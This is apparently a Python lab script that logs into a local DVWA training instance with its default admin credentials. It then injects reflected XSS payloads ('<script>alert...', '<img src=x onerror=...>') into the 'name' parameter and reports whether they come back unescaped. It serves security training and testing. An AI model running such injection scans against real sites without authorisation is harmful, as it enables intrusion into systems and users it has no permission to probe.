import requests
from bs4 import BeautifulSoup

# Configuration
LOGIN_URL = "http://localhost/login.php"
# Target: Reflected XSS page in DVWA
TARGET_URL = "http://localhost/vulnerabilities/xss_r/"

# Payloads: Scripts we will try to inject
# If the site prints these back exactly as written, it is vulnerable.
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "<h1>XSS_TEST</h1>"
]

USERNAME = "admin"
PASSWORD = "password"

session = requests.Session()

def login():
    """Logs into DVWA to allow scanning."""
    print(f"[*] Logging in to {LOGIN_URL}...")
    try:
        response = session.get(LOGIN_URL)
        soup = BeautifulSoup(response.text, "html.parser")
        
        # Get CSRF Token
        token_input = soup.find("input", {"name": "user_token"})
        if not token_input:
            print("[-] Error: Could not find user_token. Are you already logged in?")
            return False
        user_token = token_input['value']
        
        login_data = {
            "username": USERNAME,
            "password": PASSWORD,
            "Login": "Login",
            "user_token": user_token
        }
        
        response = session.post(LOGIN_URL, data=login_data)
        if "Welcome to Damn Vulnerable Web Application" in response.text:
            print("[+] Login Successful!")
            return True
        else:
            print("[-] Login Failed.")
            return False
    except Exception as e:
        print(f"[-] Connection Error: {e}")
        return False

def test_xss():
    """Injects XSS payloads into the 'name' parameter."""
    print(f"\n[*] Starting XSS Scan on: {TARGET_URL}")
    
    for payload in XSS_PAYLOADS:
        print(f"    [TEST] Injecting payload: {payload}")
        
        # In DVWA Reflected XSS, the parameter is 'name'
        # URL becomes: .../xss_r/?name=<script>...
        params = {"name": payload}
        
        response = session.get(TARGET_URL, params=params)
        
        # ANALYSIS:
        # We check if our payload appears literally in the response HTML.
        # If it does, the browser would execute it.
        if payload in response.text:
            print(f"       [!!!] VULNERABILITY DETECTED (Reflected XSS)")
            print(f"       -> Payload was reflected back by the server: {payload}")
            return # Stop after finding a vulnerability
        else:
            print("       [-] Payload failed (sanitized or blocked).")

if __name__ == "__main__":
    if login():
        test_xss()